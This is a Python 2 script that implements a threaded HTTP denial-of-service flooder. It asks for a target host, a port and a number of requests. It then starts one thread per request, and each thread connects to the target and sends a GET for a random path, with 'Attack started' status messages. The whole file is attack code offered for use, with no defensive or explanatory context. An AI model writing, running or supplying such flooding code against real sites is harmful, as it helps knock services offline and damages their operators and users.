import random
import socket
import string
import sys
import threading
import time
host = ""
ip = ""
port = 0
num_requests = 0
thread_num = 0
thread_num_mutex = threading.Lock()
def status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    print("\33[94;1mSending packets to target [{}]\33[00m".format(thread_num))
    thread_num_mutex.release()
def urli_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data
def attack():
    status()
    url_path = urli_path()
     # Creating a soccket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        dos.connect((ip, port))
        dos.send("GET /%s HTTP/1.1\nHost: %s \n\n" % (url_path, host))
    except socket.error:
        print("\33[91;1mNo connection, server may be down \33[00m")
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()
def ddos():
    using = '\33[91;1musing\33[00m(\33[92;1mddos\33[00m) '
    global host
    global port
    global ip
    global num_requests
    host = raw_input(using + 'host<( ')
    port = input(using + 'port<( ')
    num_requests = input(using + 'requests<( ')
    try:
        host = str(host).replace("https://", "").replace("http://", "").replace("www.", "")
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        print(" ERROR\n Make sure you entered a correct website")
        sys.exit(1)
    print("[^] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests))
    time.sleep(3)
    all_threads = []
    for i in xrange(num_requests):
        t1 = threading.Thread(target=attack)
        t1.start()
        all_threads.append(t1)
        time.sleep(0.01)
    for current_thread in all_threads:
        current_thread.join()

    
